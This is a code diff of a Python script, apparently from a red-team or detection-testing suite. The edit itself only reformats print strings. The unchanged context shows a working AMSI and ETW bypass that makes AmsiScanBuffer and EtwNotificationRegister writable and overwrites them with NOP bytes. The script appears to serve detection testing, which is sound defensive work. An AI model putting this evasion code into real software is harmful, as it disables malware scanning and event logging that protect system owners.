@@ -54,10 +54,10 @@ def main():
     OLD_PROTECTION = wintypes.LPDWORD(ctypes.c_ulong(0))
 
     if platform.architecture()[0] == '64bit':
-        print('[+] using x64 based patch')
+        print(f'[+] using x64 based patch')
         patch = (ctypes.c_char * 6)(0x90, 0x90, 0x90, 0x90, 0x90, 0x90)
     if platform.architecture()[0] != '64bit':
-        print('[+] using x86 based patch')
+        print(f'[+] using x86 based patch')
         patch = (ctypes.c_char * 8)(0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90)
 
     lib = LoadLibraryA(b"amsi.dll")
@@ -73,13 +73,13 @@ def main():
     amsi_rwx = VirtualProtect(amsi, ctypes.sizeof(patch), RWX, OLD_PROTECTION)
     etw_rwx = VirtualProtect(etw, ctypes.sizeof(patch), RWX, OLD_PROTECTION)
     if amsi_rwx and etw_rwx:
-        print('[+] Changed Proctection of AmsiScanBuffer and EtwNotificationRegister to RWX')
+        print(f'[+] Changed Proctection of AmsiScanBuffer and EtwNotificationRegister to RWX')
 
     c_null = ctypes.c_int(0)
     amsi_bypass = WriteProcessMemory(GetCurrentProcess(), amsi, patch, ctypes.sizeof(patch), ctypes.byref(c_null))
     etw_bypass = WriteProcessMemory(GetCurrentProcess(), etw, patch, ctypes.sizeof(patch), ctypes.byref(c_null))
     if amsi_bypass and etw_bypass:
-        print('[*] RTA Done - Patched AmsiScanBuffer & EtwNotificationRegister!')
+        print(f'[*] RTA Done - Patched AmsiScanBuffer & EtwNotificationRegister!')
 
 if __name__ == "__main__":
     exit(main())
